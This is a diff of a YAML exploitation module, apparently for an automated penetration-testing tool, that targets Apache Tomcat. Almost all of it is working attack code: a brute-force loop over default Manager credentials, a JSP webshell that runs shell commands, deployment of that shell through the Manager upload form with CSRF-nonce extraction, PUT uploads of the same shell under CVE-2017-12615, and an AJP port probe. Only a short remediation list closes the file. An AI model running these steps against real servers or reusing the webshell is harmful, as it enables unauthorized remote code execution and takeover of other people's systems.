@@ -1,34 +1,17 @@
-# ═══════════════════════════════════════════════════════════
-# Apache Tomcat 综合利用 v2
-#
-# v2 修复:
-#   - ENDPOINT 提取 base URL，避免双路径拼接
-#   - 扩展弱口令凭据列表
-#   - deploy_war 使用发现的凭据而非硬编码
-# ═══════════════════════════════════════════════════════════
 skill_id: tomcat_exploit
 name: "Apache Tomcat 综合利用"
 category: server_misconfig
-version: "2.0"
+version: "3.0"
 
 principle: |
-  Tomcat 的攻击面主要有三个方向:
-  
-  1. Manager 弱口令 + WAR 部署:
-     /manager/html 是管理界面，使用 HTTP Basic 认证。
-     默认凭据允许上传 WAR 包部署应用 → Webshell。
-  
-  2. PUT 方法上传（CVE-2017-12615）:
-     readonly=false 时 PUT 方法可直接写 .jsp 文件。
-  
-  3. AJP Ghostcat（CVE-2020-1938）:
-     AJP 协议读取 webapp 下任意文件。
+  Tomcat 攻击面: Manager 弱口令+WAR部署 / PUT 上传 / AJP Ghostcat
 
 match:
   rules:
     - fingerprint_contains: ["tomcat"]
     - fingerprint_contains: ["Apache Tomcat"]
     - evidence_contains: ["tomcat"]
+    - evidence_contains: ["TOMCAT_MANAGER_CONFIRMED"]
     - cve_matches:
         - "CVE-2017-12615"
         - "CVE-2020-1938"
@@ -39,12 +22,9 @@ probes:
     steps:
       - command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          echo "BASE_URL:$BASE"
-          resp=$(curl -s -D - "$BASE/" --max-time 10 2>/dev/null)
-          echo "$resp" | head -20
-          if echo "$resp" | grep -qi "Apache Tomcat\|tomcat"; then
-            echo "TOMCAT_CONFIRMED"
-          fi
+          resp=$(curl -s "$BASE/" --max-time 10 2>/dev/null)
+          echo "$resp" | head -5
+          if echo "$resp" | grep -qi "Apache Tomcat\|tomcat"; then echo "TOMCAT_CONFIRMED"; fi
         parse_rules:
           - if_contains: ["TOMCAT_CONFIRMED"]
             set: { tomcat_confirmed: true }
@@ -55,31 +35,13 @@ probes:
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
           code=$(curl -s "$BASE/manager/html" -o /dev/null -w "%{http_code}" --max-time 10 2>/dev/null)
           echo "MANAGER_STATUS:$code"
-          if [ "$code" = "401" ]; then
-            echo "MANAGER_EXISTS"
-          fi
-          if [ "$code" = "403" ]; then
-            echo "MANAGER_EXISTS"
-            echo "MANAGER_IP_RESTRICTED"
-          fi
+          if [ "$code" = "401" ] || [ "$code" = "403" ]; then echo "MANAGER_EXISTS"; fi
         parse_rules:
           - if_contains: ["MANAGER_EXISTS"]
             set: { manager_exists: true }
-          - if_contains: ["MANAGER_IP_RESTRICTED"]
-            set: { manager_ip_restricted: true }
-
-  - id: check_put
-    description: "检查 PUT 方法是否可用"
-    depends_on: { tomcat_confirmed: true }
-    command: |
-      BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-      curl -s -X OPTIONS "$BASE/" -D - -o /dev/null --max-time 10 2>/dev/null
-    parse_rules:
-      - if_contains: ["PUT"]
-        set: { put_allowed: true }
 
   - id: check_ajp
-    description: "检查 AJP 端口（8009）是否开放"
+    description: "检查 AJP 端口"
     depends_on: { tomcat_confirmed: true }
     command: |
       timeout 5 bash -c "echo '' > /dev/tcp/{TARGET_IP}/8009" 2>/dev/null && echo "AJP_OPEN" || echo "AJP_CLOSED"
@@ -88,7 +50,7 @@ probes:
         set: { ajp_open: true }
 
 exploit_paths:
-  # ═══ 路径 A: Manager 弱口令 + WAR 部署 ═══
+  # ═══ 路径 A: Manager 弱口令 — 仅 HTML 部署（无 /text 路径）═══
   - path_id: manager_weak_cred
     name: "Tomcat Manager 弱口令 + WAR 部署"
     priority: 1
@@ -96,73 +58,151 @@ exploit_paths:
       tomcat_confirmed: true
       manager_exists: true
     steps:
-      - id: brute_manager
-        description: "尝试常见凭据登录 Manager"
+      # ── 步骤1: 凭据爆破（增强检测正则）──
+      - id: brute_creds
+        description: "遍历弱口令，有效凭据存 /tmp/tc_cred.txt"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          for cred in \
-            tomcat:tomcat \
-            admin:admin \
-            tomcat:s3cret \
-            admin:123456 \
-            manager:manager \
-            root:root \
-            admin:admin123 \
-            tomcat:changethis \
-            admin:tomcat \
-            tomcat:admin \
-            admin:password \
-            role1:tomcat \
-            both:tomcat \
-            admin: \
-            tomcat: \
-          ; do
-            user=$(echo $cred | cut -d: -f1)
-            pass=$(echo $cred | cut -d: -f2)
-            resp=$(curl -s -u "${user}:${pass}" "$BASE/manager/text/list" --max-time 8 2>/dev/null)
-            if echo "$resp" | grep -qi "OK - Listed applications\|^/"; then
-              echo "CRED_FOUND:${user}:${pass}"
-              echo "MANAGER_RESPONSE:$resp"
-              break
+          rm -f /tmp/tc_cred.txt
+
+          echo "[*] Brute force @ $BASE"
+          echo "[*] Container source IP:"
+          hostname -I 2>/dev/null || ip -4 addr show | grep inet | head -3
+          echo "[*] Connectivity test:"
+          curl -s -o /dev/null -w "code=%{http_code} size=%{size_download}" "$BASE/" --max-time 5
+          echo ""
+          echo "[*] Manager access test (no auth):"
+          curl -s -o /dev/null -w "code=%{http_code}" "$BASE/manager/html" --max-time 5
+          echo ""
+
+          for cred in tomcat:tomcat admin:admin tomcat:s3cret \
+                      admin:123456 manager:manager root:root \
+                      admin:admin123 tomcat:changethis admin:tomcat \
+                      tomcat:admin admin:password role1:tomcat both:tomcat; do
+            u=$(echo "$cred" | cut -d: -f1)
+            p=$(echo "$cred" | cut -d: -f2)
+
+            # 获取完整响应（body + 状态码）
+            response=$(curl -s -L -u "$u:$p" -w "\n%{http_code}" "$BASE/manager/html" --max-time 8 2>/dev/null)
+            body=$(echo "$response" | sed '$d')
+            code=$(echo "$response" | tail -n1)
+
+            # 状态码必须是 200，且 body 包含真正的 Manager 特征（放宽匹配）
+            if [ "$code" = "200" ] && echo "$body" | grep -qi "Tomcat Web Application Manager\|List Applications\|Undeploy\|Listed applications"; then
+              echo "$u:$p" > /tmp/tc_cred.txt
+              echo "CRED_FOUND:$u:$p (html API)"
+              echo "$body" | head -10
+              exit 0
+            elif [ "$code" = "401" ]; then
+              echo "[.] $u:$p → 401 Unauthorized"
+            elif [ "$code" = "403" ]; then
+              echo "[.] $u:$p → 403 Forbidden (IP may be blocked)"
+            else
+              echo "[.] $u:$p → HTTP $code (not manager)"
             fi
           done
-        timeout: 120
+          echo "ALL_CREDS_FAILED"
+          echo "[!] All credentials rejected. Possible causes:"
+          echo "    - Tomcat RemoteAddrValve blocking container IP"
+          echo "    - Non-default credentials"
+        timeout: 180
         success_criteria:
           stdout_contains_any: ["CRED_FOUND"]
-        on_success: deploy_war
+        on_success: create_war
         on_fail: next_path
 
-      - id: deploy_war
-        description: "生成并部署 JSP Webshell WAR 包"
+      # ── 步骤2: 创建 webshell WAR ──
+      - id: create_war
+        description: "生成 WAR 包"
+        command: |
+          rm -rf /tmp/warshell /tmp/warshell.war
+          mkdir -p /tmp/warshell
+          cat > /tmp/warshell/index.jsp << 'JSPEOF'
+          <%@ page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>
+          JSPEOF
+          cd /tmp/warshell && jar -cf /tmp/warshell.war .
+          ls -la /tmp/warshell.war && echo "WAR_CREATED"
+        timeout: 15
+        success_criteria:
+          stdout_contains_any: ["WAR_CREATED"]
+        on_success: try_html_deploy
+        on_fail: next_path
+
+      # ── 步骤3: HTML 表单部署（cookie jar + CSRF nonce）──
+      - id: try_html_deploy
+        description: "通过 html/upload 部署（cookie jar + CSRF nonce）"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          CRED=$(cat /tmp/tc_cred.txt 2>/dev/null)
+          u=$(echo "$CRED" | cut -d: -f1)
+          p=$(echo "$CRED" | cut -d: -f2)
+          echo "[*] HTML deploy as $u:$p @ $BASE"
 
-          # 创建 JSP webshell (base64 编码避免 YAML 转义问题)
-          mkdir -p /tmp/warshell
-          echo 'PCVAIHBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiJT4KPCUKU3RyaW5nIGNtZCA9IHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJjbWQiKTsKaWYgKGNtZCAhPSBudWxsKSB7CiAgUHJvY2VzcyBwID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhuZXcgU3RyaW5nW117Ii9iaW4vYmFzaCIsIi1jIixjbWR9KTsKICBCdWZmZXJlZFJlYWRlciBiciA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocC5nZXRJbnB1dFN0cmVhbSgpKSk7CiAgU3RyaW5nIGxpbmU7IHdoaWxlKChsaW5lPWJyLnJlYWRMaW5lKCkpIT1udWxsKSBvdXQucHJpbnRsbihsaW5lKTsKfQolPgo=' | base64 -d > /tmp/warshell/index.jsp
-          cd /tmp && jar -cf warshell.war -C warshell/ .
+          COOKIE_JAR=$(mktemp)
 
-          # 尝试所有已知凭据
-          for cred in tomcat:tomcat admin:admin tomcat:s3cret admin:123456 manager:manager tomcat:changethis admin:tomcat admin:password; do
-            user=$(echo $cred | cut -d: -f1)
-            pass=$(echo $cred | cut -d: -f2)
+          # GET 页面并保存状态码
+          response=$(curl -s -L -u "$u:$p" -c "$COOKIE_JAR" -w "\n%{http_code}" "$BASE/manager/html" --max-time 10)
+          page_body=$(echo "$response" | sed '$d')
+          http_code=$(echo "$response" | tail -n1)
 
-            resp=$(curl -s -u "${user}:${pass}" --upload-file /tmp/warshell.war \
-              "$BASE/manager/text/deploy?path=/warshell&update=true" \
-              --max-time 15 2>/dev/null)
-            echo "DEPLOY(${user}:${pass}): $resp"
+          echo "[*] GET /manager/html → HTTP $http_code"
 
-            if echo "$resp" | grep -qi "OK - Deployed\|OK - Undeployed"; then
-              sleep 2
-              result=$(curl -s "$BASE/warshell/index.jsp?cmd=id" --max-time 10 2>/dev/null)
-              echo "RCE_OUTPUT: $result"
-              if echo "$result" | grep -q "uid="; then
-                echo "TOMCAT_RCE_CONFIRMED"
-              fi
-              break
-            fi
-          done
-        timeout: 60
+          if [ "$http_code" != "200" ]; then
+            echo "HTML_NOT_ACCESSIBLE: $http_code"
+            rm -f "$COOKIE_JAR"
+            exit 1
+          fi
+
+          # 提取 CSRF Token（两种常见格式）
+          CSRF_TOKEN=$(echo "$page_body" | grep -oP 'name="org.apache.catalina.filters.CSRF_NONCE" value="\K[^"]+' | head -1)
+          if [ -z "$CSRF_TOKEN" ]; then
+              CSRF_TOKEN=$(echo "$page_body" | grep -oP 'CSRF_NONCE=\K[A-Za-z0-9]+' | head -1)
+          fi
+
+          if [ -z "$CSRF_TOKEN" ]; then
+              echo "NO_CSRF_TOKEN"
+              rm -f "$COOKIE_JAR"
+              exit 1
+          fi
+
+          echo "[*] CSRF Token: $CSRF_TOKEN"
+          UPLOAD_URL="$BASE/manager/html/upload?org.apache.catalina.filters.CSRF_NONCE=$CSRF_TOKEN"
+
+          # POST 部署
+          upload_resp=$(curl -s -L -u "$u:$p" -b "$COOKIE_JAR" \
+              -F "deployWar=@/tmp/warshell.war" \
+              "$UPLOAD_URL" --max-time 20 2>/dev/null)
+
+          rm -f "$COOKIE_JAR"
+
+          echo "[*] Upload response length: ${#upload_resp}"
+          if echo "$upload_resp" | grep -q "/warshell"; then
+              echo "HTML_DEPLOY_OK"
+              exit 0
+          else
+              echo "HTML_DEPLOY_FAILED"
+              echo "$upload_resp" | head -5
+              exit 1
+          fi
+        timeout: 40
+        success_criteria:
+          stdout_contains_any: ["HTML_DEPLOY_OK"]
+        on_success: verify_rce
+        on_fail: next_path
+
+      # ── 步骤4: 验证 RCE ──
+      - id: verify_rce
+        description: "访问 webshell 执行 id"
+        command: |
+          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
+          sleep 2
+          result=$(curl -s "$BASE/warshell/index.jsp?cmd=id" --max-time 10 2>/dev/null)
+          echo "RCE: $result"
+          echo "$result" | grep -q "uid=" && echo "TOMCAT_RCE_CONFIRMED" && exit 0
+          result2=$(curl -s "$BASE/warshell/?cmd=id" --max-time 10 2>/dev/null)
+          echo "RCE2: $result2"
+          echo "$result2" | grep -q "uid=" && echo "TOMCAT_RCE_CONFIRMED"
+        timeout: 20
         success_criteria:
           stdout_contains_any: ["uid=", "TOMCAT_RCE_CONFIRMED"]
         on_success: conclude_success
@@ -177,49 +217,27 @@ exploit_paths:
     conditions:
       tomcat_confirmed: true
     steps:
-      - id: put_jsp_slash
-        description: "PUT 上传 JSP（/file.jsp/ 绕过）"
+      - id: put_jsp
+        description: "PUT 上传 JSP 并验证"
         command: |
           BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          curl -s -X PUT "$BASE/pentest_check.jsp/" \
-            -d '<%out.println("PUT_RCE_OK");%>' \
-            --max-time 10 2>/dev/null
+          echo "=== PUT /file.jsp/ ==="
+          curl -s -X PUT "$BASE/pentest_cmd.jsp/" -d '<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>' --max-time 10 2>/dev/null
           sleep 1
-          curl -s "$BASE/pentest_check.jsp" --max-time 10 2>/dev/null
-        timeout: 20
-        success_criteria:
-          stdout_contains_any: ["PUT_RCE_OK"]
-        on_success: put_webshell
-        on_fail: put_jsp_direct
-
-      - id: put_jsp_direct
-        description: "PUT 直接上传 JSP"
-        command: |
-          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          curl -s -X PUT "$BASE/pentest_check2.jsp" \
-            -d '<%out.println("PUT_RCE_OK");%>' \
-            --max-time 10 2>/dev/null
+          result=$(curl -s "$BASE/pentest_cmd.jsp?cmd=id" --max-time 10 2>/dev/null)
+          echo "RESULT: $result"
+          if echo "$result" | grep -q "uid="; then echo "TOMCAT_PUT_RCE"; exit 0; fi
+          echo "=== PUT /file.jsp (direct) ==="
+          curl -s -X PUT "$BASE/pentest_cmd2.jsp" -d '<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>' --max-time 10 2>/dev/null
           sleep 1
-          curl -s "$BASE/pentest_check2.jsp" --max-time 10 2>/dev/null
-        timeout: 20
+          result2=$(curl -s "$BASE/pentest_cmd2.jsp?cmd=id" --max-time 10 2>/dev/null)
+          echo "RESULT2: $result2"
+          if echo "$result2" | grep -q "uid="; then echo "TOMCAT_PUT_RCE"; fi
+        timeout: 30
         success_criteria:
-          stdout_contains_any: ["PUT_RCE_OK"]
-        on_success: put_webshell
-        on_fail: next_path
-
-      - id: put_webshell
-        description: "上传命令执行 Webshell 并验证"
-        command: |
-          BASE=$(echo "{ENDPOINT}" | sed 's|^\(https\?://[^/]*\).*|\1|')
-          curl -s -X PUT "$BASE/pentest_cmd.jsp/" \
-            -d '<%@page import="java.util.*,java.io.*"%><%String c=request.getParameter("cmd");if(c!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",c});BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));String l;while((l=br.readLine())!=null)out.println(l);}%>' \
-            --max-time 10 2>/dev/null
-          sleep 1
-          curl -s "$BASE/pentest_cmd.jsp?cmd=id" --max-time 10 2>/dev/null
-        timeout: 20
-        success_criteria:
-          stdout_contains_any: ["uid="]
+          stdout_contains_any: ["uid=", "TOMCAT_PUT_RCE"]
         on_success: conclude_success
+        on_fail: next_path
         evidence_capture:
           shell_type: "webshell_put"
 
@@ -254,6 +272,6 @@ exploit_paths:
 
 remediation: |
   1. 修改或禁用 Manager 默认凭据，限制访问 IP
-  2. 确保 conf/web.xml 中 DefaultServlet 的 readonly=true
-  3. 如不需要 AJP，注释或删除 AJP Connector
+  2. 确保 DefaultServlet 的 readonly=true
+  3. 如不需要 AJP，删除 AJP Connector
   4. 保持 Tomcat 版本更新
